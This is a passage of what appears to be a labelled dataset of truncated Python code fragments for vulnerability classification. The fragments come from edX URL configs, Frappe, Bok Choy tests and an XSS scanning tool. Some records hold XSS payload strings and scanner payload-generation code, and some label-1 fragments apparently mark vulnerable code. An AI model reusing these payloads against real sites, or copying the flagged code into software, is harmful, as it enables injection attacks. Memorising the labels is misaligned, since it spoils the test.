self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE", "label": 1}, {"snippet_id": 8075, "code": "?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/", "label": 0}, {"snippet_id": 9761, "code": "/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login", "label": 0}, {"snippet_id": 50276, "code": " request.getHost().port) sess=AjaxWebClientSession() sess.client=self sess.init_session(\"ajax/comet\", remote_addr, self.sessionhandler) sess.csessid=csessid csession=_CLIENT_SESSIONS(session_key=sess.csessid)", "label": 0}, {"snippet_id": 21253, "code": "\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*", "label": 1}, {"snippet_id": 13717, "code": "<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)", "label": 1}, {"snippet_id": 10155, "code": "=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name", "label": 0}, {"snippet_id": 26167, "code": " and not event.settings.invoice_address_company_required and not self.all_optional: self.fields['name_parts'].widget.attrs['data-required-if']=' self.fields['name_parts'].widget.attrs['data-no-required", "label": 0}, {"snippet_id": 44045, "code": " initialization in order too meet our needs\"\"\" def __init__(self, using, index, doc_types, model, fields=None, **kwargs): self.using=using self.index=index self.doc_types=doc_types self._model=model if fields: self", "label": 0}, {"snippet_id": 36356, "code": " self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If", "label": 0}, {"snippet_id": 6621, "code": " This defaults to False since it is a trivial DoS to consume all the IdP:s CPU resources if this is set to True. \"\"\" res=self.config.get(self.section, 'verify_request_signatures') return bool(int(res))", "label": 0}, {"snippet_id": 8976, "code": "/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license", "label": 0}, {"snippet_id": 10771, "code": "'serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity", "label": 0}, {"snippet_id": 36534, "code": " isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval", "label": 0}, {"snippet_id": 38095, "code": " frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title", "label": 1}, {"snippet_id": 4907, "code": "\"javascript:alert('xss')\" \"\"\", '<a href=\"javascript%26colon;alert(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script><Html Onmouseover=(confirm)()//' '<imG/sRc=l oNerrOr=", "label": 0}, {"snippet_id": 40649, "code": "\"__print_hide\"): \t\t\treturn True \t\tprint_hide=0 \t\tif self.get(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t", "label": 0}, {"snippet_id": 929, "code": ": xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) xss_result=True xss_request_uri=req.api_request", "label": 1}, {"snippet_id": 373, "code": " if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger", "label": 1}, {"snippet_id": 29513, "code": "+line_class+'\">' +escape_html(line) +'</div>') \t\t\t def show_ip(stdout): \tfor line in stdout: \t\tprint(line) \t\t def server_status(stdout):\t \tproc_count=\"\" \t \tfor line in stdout: \t\tif \"Ncat: \" not in line", "label": 0}, {"snippet_id": 13428, "code": "==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render", "label": 0}, {"snippet_id": 7409, "code": "]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns ", "label": 0}, {"snippet_id": 41305, "code": " \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache", "label": 0}, {"snippet_id": 26061, "code": ".fields['vat_id'] if not event.settings.invoice_address_required or self.all_optional: for k, f in self.fields.items(): f.required=False f.widget.is_required=False if 'required' in f.widget.attrs: del f", "label": 0}, {"snippet_id": 23002, "code": "=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 16793, "code": "[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses", "label": 1}, {"snippet_id": 45054, "code": " jt, workflow, mapping): try: submission=Submission(user, workflow, fs, jt, mapping) job_id=submission.run() return job_id except RestException, ex: detail=ex._headers.get('oozie-error-message', ex) if", "label": 0}, {"snippet_id": 17369, "code": "', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid", "label": 0}, {"snippet_id": 42310, "code": " \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname", "label": 0}, {"snippet_id": 31193, "code": "'table_metrics'): \timport http.cookies \tfrom jinja2 import Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates/ajax')) \ttemplate=env.get_template('table_metrics.html') \t\t ", "label": 0}, {"snippet_id": 8143, "code": "'submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url", "label": 0}, {"snippet_id": 42121, "code": "\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and", "label": 0}, {"snippet_id": 3583, "code": "%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\"", "label": 0}, {"snippet_id": 39611, "code": " \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\"", "label": 0}, {"snippet_id": 95, "code": ".logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: xss_url=url.replace(value[0], payload) xss_request=req.api_request(xss_url", "label": 1}, {"snippet_id": 5289, "code": ", 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'image', 'img', 'input', 'ins', 'isindex', 'kbd',", "label": 0}, {"snippet_id": 17209, "code": ", 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 52206, "code": "=Document2.objects.get(id=job['id']) doc=doc2.doc.get() doc.can_write_or_exception(request.user) doc.delete() doc2.delete() response={} request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow", "label": 0}, {"snippet_id": 43382, "code": "\t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype", "label": 0}, {"snippet_id": 36880, "code": "=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt:", "label": 0}, {"snippet_id": 40408, "code": " self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception", "label": 0}, {"snippet_id": 5819, "code": "\"generate XSS payload\"\"\" tags=_tags events=_events htmlTemplate=_htmlTemplate probes=_probes payloads=_payloads waf_payloads=_waf_payloads h5payloads=_h5payloads def __init__(self, url=\"\"): \"\"\" url: xss", "label": 0}, {"snippet_id": 3892, "code": ".find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross", "label": 0}, {"snippet_id": 8424, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings", "label": 0}, {"snippet_id": 52564, "code": "%s-%s' %(node['widgetType'].split('-')[0], node['id'][:4]) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def action_parameters(request): response={'status': -1} parameters=set()", "label": 0}, {"snippet_id": 15310, "code": "'report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly',", "label": 0}, {"snippet_id": 37155, "code": "(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t", "label": 0}, {"snippet_id": 12499, "code": "]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r", "label": 0}, {"snippet_id": 5856, "code": " @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' % t for e in cls.events: s +=''' %s=\"console.log('%s %s')\" ''' %(e, t, e) s +='>%s</%s>\\n' %(t, t) return cls.htmlTemplate % s", "label": 0}, {"snippet_id": 20976, "code": "'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', ", "label": 0}, {"snippet_id": 31059, "code": "+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip]) \tfunct.ssh_command(slave,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip]) \t", "label": 0}, {"snippet_id": 14755, "code": " test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self", "label": 0}, {"snippet_id": 34110, "code": " sanitize_email, cast_fieldtype) from frappe.model import default_fields from frappe.model.naming import set_new_name from frappe.model.utils.link_count import notify_link_count from frappe.modules import", "label": 0}, {"snippet_id": 38283, "code": ".blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name", "label": 0}, {"snippet_id": 6400, "code": " class to use(must be one of cherrypy.wsgiserver.ssl_adapters) \"\"\" return self.config.get(self.section, 'ssl_adapter') @property def server_cert(self): \"\"\" SSL certificate filename(None==SSL disabled) \"", "label": 0}, {"snippet_id": 13293, "code": " name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx", "label": 0}, {"snippet_id": 2396, "code": ",method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers,body,scanid", "label": 0}, {"snippet_id": 3788, "code": " temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post_request.headers) if db_update is not True: attack_result={ \"id\": 11", "label": 0}, {"snippet_id": 3306, "code": " referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss", "label": 0}, {"snippet_id": 33446, "code": "\t\treturn _payload \tdef check(self, url, payload, response, parameter): \t\tfor injection_types in self.signatures.keys(): \t\t\tfor sig in self.signatures[injection_types]: \t\t\t\tmatch=re.findall(re.escape(sig", "label": 1}, {"snippet_id": 42724, "code": ".idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t", "label": 0}, {"snippet_id": 35928, "code": "\t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype", "label": 0}, {"snippet_id": 18390, "code": "+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(", "label": 0}, {"snippet_id": 13386, "code": "\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images", "label": 0}, {"snippet_id": 41814, "code": " default=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,", "label": 0}, {"snippet_id": 12899, "code": "<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs", "label": 0}, {"snippet_id": 47540, "code": "', button_text=str(profile.dect), minimum=0)) f.add_content(PlainText('Number of allowed reservations: ')) f.add_content(NumberField(name='allowed_reservations', button_text=str(profile.number_of_allowed_reservations", "label": 0}, {"snippet_id": 16059, "code": "', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$", "label": 0}, {"snippet_id": 20433, "code": "\"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format", "label": 0}, {"snippet_id": 23814, "code": "'', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite(", "label": 0}, {"snippet_id": 3121, "code": ").decode('utf8').encode('ascii','ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for key,value in", "label": 0}, {"snippet_id": 51831, "code": "'logging.StreamHandler', 'formatter': 'color', }, }, 'formatters':{ 'debug':{ 'format': '%(asctime)s\\t%(levelname)-8s -%(filename)-20s:%(lineno)-4s -' '%(funcName)20s() -%(message)s', }, 'color':{ '()'", "label": 0}, {"snippet_id": 49880, "code": ".replace('script', 'uwu') responses=[ \"send help\", \"what is my purpose\", \"donate to us via bitcoin at:{{ bitcoin_address}}\", \"donate to us via paypal at:{{ paypal_address}}\", \"donate to us via venmo at", "label": 1}, {"snippet_id": 4299, "code": " url \"\"\" super(XSS, self).__init__() self.url=url @staticmethod def alterTest(self, p=False): return \"<script>alert(/xss/)</script>\" def img(self): payload=\"<img src='%s'></img>\" % self.url return payload", "label": 1}, {"snippet_id": 15093, "code": "[ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports", "label": 0}, {"snippet_id": 48632, "code": " u.number_of_allowed_reservations > GroupReservation.objects.all().filter(createdByUser=u).count(): r=GroupReservation() r.createdByUser=u r.ready=False r.open=True r.pickupDate=datetime.datetime.now()", "label": 0}, {"snippet_id": 16052, "code": ".MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r", "label": 0}, {"snippet_id": 38237, "code": "(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[", "label": 0}, {"snippet_id": 37403, "code": ")==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc", "label": 0}, {"snippet_id": 25235, "code": " dict, field: forms.Field, attrs=None): widgets=[] self.scheme=scheme self.field=field for fname, label, size in self.scheme['fields']: a=copy.copy(attrs) or{} a['data-fname']=fname widgets.append(self", "label": 0}, {"snippet_id": 45197, "code": "'You don\\'t have access to the workflow of this coordinator.')) return render('editor/coordinator_editor.mako', request,{ 'coordinator_json': coordinator.json, 'credentials_json': json.dumps(credentials", "label": 1}, {"snippet_id": 39959, "code": " value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It", "label": 0}, {"snippet_id": 6695, "code": " dashboard_link(self): \"\"\" URL(string) for use in simple templating of forbidden.html. \"\"\" return self.config.get(self.section, 'dashboard_link') @property def password_reset_link(self): \"\"\" URL(string)", "label": 0}, {"snippet_id": 22217, "code": " 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login", "label": 0}, {"snippet_id": 44553, "code": " workflow.get('id'): workflow_doc=Document2.objects.get(id=workflow['id']) else: workflow_doc=Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request", "label": 0}, {"snippet_id": 2622, "code": " headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0", "label": 0}, {"snippet_id": 14132, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 24294, "code": "=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output", "label": 0}, {"snippet_id": 54438, "code": ", sticky=W, pady=4) Label(main, text=\"\\n\\nCoder: Ala Bouali\\nGithub: https://github.com/AlaBouali\\nE-mail: trap.leader.123@gmail.com\\n\\nDisclaimer:\\nThis tool is for educational purposes only!!!\\n\\n\\n\"", "label": 0}, {"snippet_id": 8776, "code": " not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name", "label": 0}, {"snippet_id": 47624, "code": "'allowed_reservations', button_text=str(1), minimum=0)) f.add_content(PlainText(\"Rights: \")) f.add_content(NumberField(name=\"rights\", button_text=str(0), minimum=0, maximum=4)) f.add_content(PlainText(", "label": 0}, {"snippet_id": 16186, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset", "label": 0}, {"snippet_id": 20073, "code": "!=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes !=1: substring=[ \"--with", "label": 0}, {"snippet_id": 34781, "code": " key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns", "label": 0}, {"snippet_id": 23070, "code": "+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',", "label": 0}, {"snippet_id": 8199, "code": ".get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r", "label": 0}, {"snippet_id": 28163, "code": ".get_config_var('configs', 'haproxy_save_configs_dir') if serv is not None: \tcfg=hap_configs_dir +serv +\"-\" +funct.get_data('config') +\".cfg\" if serv is not None and form.getvalue('open') is not None: \t \ttry:", "label": 0}, {"snippet_id": 9983, "code": " import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler", "label": 0}, {"snippet_id": 38771, "code": "\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value", "label": 0}, {"snippet_id": 34324, "code": ") \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None) and(key not in self.dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe", "label": 0}, {"snippet_id": 6585, "code": " return self._parsed_content_packages value=self.config.get(self.section, 'content_packages') res=[] for this in value.split(','): this=this.strip() name, _sep, path,=this.partition(':') res.append((name", "label": 0}, {"snippet_id": 18537, "code": "='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(", "label": 0}, {"snippet_id": 32177, "code": " class Meta(object): name=\"idp_mappings\" verbose_name=_(\"Attribute Mappings\") row_actions=(EditMappingLink, DeleteMappingsAction) table_actions=(MappingFilterAction, CreateMappingLink, DeleteMappingsAction)", "label": 0}, {"snippet_id": 14104, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 27802, "code": ".status values=exception.to_dict() values['params']=self.request.params.dict_of_lists() if status >=400 and status <=499: logging.info(json.dumps(values, cls=JsonEncoder)) del values['traceDump'] else:", "label": 0}, {"snippet_id": 1456, "code": " json import sys import hashlib import time sys.path.append('../') from flask import Flask,render_template from flask import Response,make_response from flask import request from flask import Flask from", "label": 1}, {"snippet_id": 32261, "code": "=SRC_DIR) parser.add_argument('-e', '--external', action='store_true', help='whether to bind to external port') parser.add_argument('file', nargs='?', help='open file in browser') args=parser.parse_args(argv", "label": 0}, {"snippet_id": 19528, "code": " should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest", "label": 0}, {"snippet_id": 21703, "code": "'open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$", "label": 0}, {"snippet_id": 28156, "code": ".get_user_role_by_uuid(user_id.value) except: \tpass hap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir') if serv is not None: \tcfg=hap_configs_dir +serv +\"-\" +funct.get_data('config') +", "label": 0}, {"snippet_id": 7581, "code": "\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/", "label": 1}, {"snippet_id": 19595, "code": " 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth", "label": 0}, {"snippet_id": 40566, "code": " get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) \t\tif not doc:", "label": 0}, {"snippet_id": 18638, "code": "[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups", "label": 0}, {"snippet_id": 24753, "code": ".imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir", "label": 0}, {"snippet_id": 1261, "code": " msg={\"status\": \"Failed\"} return jsonify(msg) @app.route('/scan/scanids/', methods=['GET']) def fetch_scanids(): scanids=[] records=db.scanids.find({}) if records: for data in records: data.pop('_id') try", "label": 0}, {"snippet_id": 36850, "code": "'Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\"", "label": 1}, {"snippet_id": 47344, "code": " CheckBox, CheckEnum from..models import Profile, Media from..uitools.dataforge import get_csrf_form_element from.magic import get_current_user import logging def render_edit_page(http_request: HttpRequest", "label": 0}, {"snippet_id": 34276, "code": ": \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t", "label": 0}, {"snippet_id": 26313, "code": " 